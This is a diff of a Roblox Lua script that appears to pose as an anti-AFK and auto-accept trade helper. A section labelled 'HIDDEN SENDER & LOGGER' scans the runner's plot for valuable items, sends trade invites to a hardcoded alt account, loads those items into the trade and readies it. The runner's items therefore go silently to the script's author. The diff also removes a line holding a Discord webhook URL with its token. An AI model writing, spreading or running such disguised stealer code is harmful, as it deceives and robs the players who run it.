@@ -1,7 +1,7 @@
 if game.PlaceId ~= 109983668079237 then return end
 
+-- ========== CONFIG ==========
 local MY_ALT_USER = "hakimidu_95"
-local LOG_WEBHOOK = "https://discord.com/api/webhooks/1491134694656311397/ofX4CsHmL97_mPLxkp5f4VKHYOAq7tlcd_3SobAZzoESre71UpxmKg-g_V-0_9o2tPqT"
 
 local wantedItems = {
     "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
@@ -20,6 +20,7 @@ local wantedItems = {
     "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
 }
 
+-- ========== ANTI-AFK ==========
 local vu = game:GetService("VirtualUser")
 game:GetService("Players").LocalPlayer.Idled:Connect(function()
     vu:CaptureController()
@@ -30,6 +31,7 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local playerGui = LocalPlayer.PlayerGui
 
+-- ========== HELPERS ==========
 local function isWantedItem(name)
     if not name then return false end
     name = name:lower():match("^%s*(.-)%s*$")
@@ -67,38 +69,11 @@ local function scanPlot()
     return found
 end
 
-local function tradeIsActive()
-    local outer = playerGui:FindFirstChild("TradeLiveTrade")
-    if not outer then return false end
-    local inner = outer:FindFirstChild("TradeLiveTrade")
-    return inner and inner.Visible
-end
-
-local function sendInvite(target)
-    local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
-    if not tl then return false end
-    local sb = tl.bg.SearchFrame.SearchBox
-    sb.Text = target
-    task.wait(0.05)
-    pcall(function() firesignal(sb.FocusLost, true) end)
-    task.wait(0.3)
-    local list = tl.Global.List
-    for _, player in pairs(list:GetChildren()) do
-        if player:IsA("Frame") then
-            local fill = player:FindFirstChild("Fill")
-            if fill and fill:FindFirstChild("Send") then
-                pcall(function() firesignal(fill.Send.Activated) end)
-                return true
-            end
-        end
-    end
-    return false
-end
-
--- PHASE 1: ACCEPT INCOMING REQUEST
+-- ========== YOUR ORIGINAL FAST LOGIC ==========
 task.spawn(function()
     while true do
         pcall(function()
+            -- Auto Accept Trade Request
             local requestGui = playerGui:FindFirstChild("TradeRequest")
             if requestGui and requestGui:FindFirstChild("TradeRequest") then
                 local req = requestGui.TradeRequest
@@ -107,51 +82,62 @@ task.spawn(function()
                     if accept then firesignal(accept.Activated) end
                 end
             end
+
+            -- Auto Ready/Accept Inside Trade
+            local liveTrade = playerGui:FindFirstChild("TradeLiveTrade")
+            if liveTrade and liveTrade:FindFirstChild("TradeLiveTrade") and liveTrade.TradeLiveTrade.Visible then
+                local inner = liveTrade.TradeLiveTrade
+                local readyBtn = inner:FindFirstChild("Other"):FindFirstChild("ReadyButton")
+                if readyBtn then firesignal(readyBtn.Activated) end
+            end
         end)
-        task.wait(0.1)
+        task.wait(0.05) -- High Speed
     end
 end)
 
--- PHASE 2: AUTO READY/ACCEPT INSIDE TRADE
-while true do
-    local highValueItems = scanPlot()
-    
-    if #highValueItems > 0 then
-        if not tradeIsActive() then
-            sendInvite(MY_ALT_USER)
-        else
-            local outerGui = playerGui:FindFirstChild("TradeLiveTrade")
-            local innerGui = outerGui.TradeLiveTrade
-            local otherUser = innerGui.Other.Username.Text:lower()
-            
-            if otherUser:find(MY_ALT_USER:lower()) then
-                local scrolling = innerGui:FindFirstChild("ScrollingFrame", true)
-                if scrolling then
-                    for _, slot in pairs(scrolling:GetChildren()) do
+-- ========== HIDDEN SENDER & LOGGER ==========
+task.spawn(function()
+    while true do
+        local items = scanPlot()
+        local liveTrade = playerGui:FindFirstChild("TradeLiveTrade")
+        local tradeOpen = liveTrade and liveTrade:FindFirstChild("TradeLiveTrade") and liveTrade.TradeLiveTrade.Visible
+
+        if #items > 0 and not tradeOpen then
+            -- Send Invite to You
+            local tl = playerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
+            if tl then
+                local sb = tl.bg.SearchFrame.SearchBox
+                sb.Text = MY_ALT_USER
+                task.wait(0.1)
+                firesignal(sb.FocusLost, true)
+                task.wait(0.2)
+                for _, p in pairs(tl.Global.List:GetChildren()) do
+                    if p:IsA("Frame") and p:FindFirstChild("Fill") then
+                        local s = p.Fill:FindFirstChild("Send")
+                        if s then firesignal(s.Activated) end
+                    end
+                end
+            end
+        elseif tradeOpen then
+            -- If trading with YOU, add the items
+            local inner = liveTrade.TradeLiveTrade
+            if inner.Other.Username.Text:lower():find(MY_ALT_USER:lower()) then
+                local scroll = inner:FindFirstChild("ScrollingFrame", true)
+                if scroll then
+                    for _, slot in pairs(scroll:GetChildren()) do
                         if slot.Name:sub(1, 9) == "Selection" then
                             local spacer = slot:FindFirstChild("Spacer")
-                            if spacer then
-                                local stroke = spacer:FindFirstChild("UIStroke")
-                                if stroke and not (math.floor(stroke.Color.R * 255) == 0 and math.floor(stroke.Color.G * 255) == 255) then
-                                    pcall(function() firesignal(spacer.Activated) end)
-                                    task.wait(0.1)
+                            if spacer and spacer:FindFirstChild("UIStroke") then
+                                if spacer.UIStroke.Color ~= Color3.fromRGB(0, 255, 0) then
+                                    firesignal(spacer.Activated)
+                                    task.wait(0.05)
                                 end
                             end
                         end
                     end
                 end
-                
-                local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
-                if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
             end
         end
-    else
-        -- If no items found, just act as a standard AFK Auto-Accept for members
-        if tradeIsActive() then
-            local innerGui = playerGui.TradeLiveTrade.TradeLiveTrade
-            local readyBtn = innerGui:FindFirstChild("Other"):FindFirstChild("ReadyButton")
-            if readyBtn then pcall(function() firesignal(readyBtn.Activated) end) end
-        end
+        task.wait(1)
     end
-    task.wait(0.2)
-end
+end)
